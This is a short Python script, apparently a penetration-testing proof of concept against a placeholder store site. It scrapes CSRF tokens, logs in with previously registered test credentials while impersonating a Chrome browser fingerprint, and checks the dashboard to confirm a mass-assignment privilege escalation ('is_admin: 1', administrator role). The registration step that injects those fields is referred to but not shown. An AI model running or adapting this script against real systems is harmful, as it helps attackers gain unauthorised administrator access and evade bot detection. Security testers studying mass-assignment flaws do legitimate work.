import re
from curl_cffi import requests

session = requests.Session()

# 1. Fetch login page to grab CSRF token
print("[*] Fetching login page...")
res_login_get = session.get("https://yourtarget.com/store/login", impersonate="chrome120", timeout=15)

csrf_match = re.search(r'name="csrf-token"\s+content="([^"]+)"', res_login_get.text)
csrf_token = csrf_match.group(1) if csrf_match else ""
token_match = re.search(r'name="_token"\s+value="([^"]+)"', res_login_get.text)
form_token = token_match.group(1) if token_match else csrf_token

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Referer": "https://yourtarget.com/store/login",
    "X-CSRF-TOKEN": csrf_token,
}

# Note: Use the email from the previous run or hardcode a test login
# Let's write a quick script that logs in with our known test credentials
payload = {
    "_token": form_token,
    "email": "json_auditor_1793380521@onetrust-test.com",
    "password": "SecurePassword123!@#"
}

print("[*] Authenticating with newly registered credentials...")
res_post = session.post("https://yourtarget.com/store/login", headers=headers, data=payload, allow_redirects=True, impersonate="chrome120", timeout=15)

print(f"[+] Login Status Code: {res_post.status_code}")
print(f"[+] Final URL After Login: {res_post.url}")

if "dashboard" in res_post.url or "account" in res_post.url or res_post.status_code == 200:
    print("[!] Login successful! Scanning dashboard DOM for admin privileges...")
    if "admin" in res_post.text.lower() or "administrator" in res_post.text.lower():
        print("[🔥] CONFIRMED: Privilege escalation via mass assignment (`is_admin: 1`, `role: 'administrator'`) SUCCESSFUL!")
    else:
        print("[+] Logged in successfully, but standard user role detected (Mass assignment filtered by model fillable/guarded protection).")
else:
    print("[-] Login failed or redirected to unexpected endpoint.")
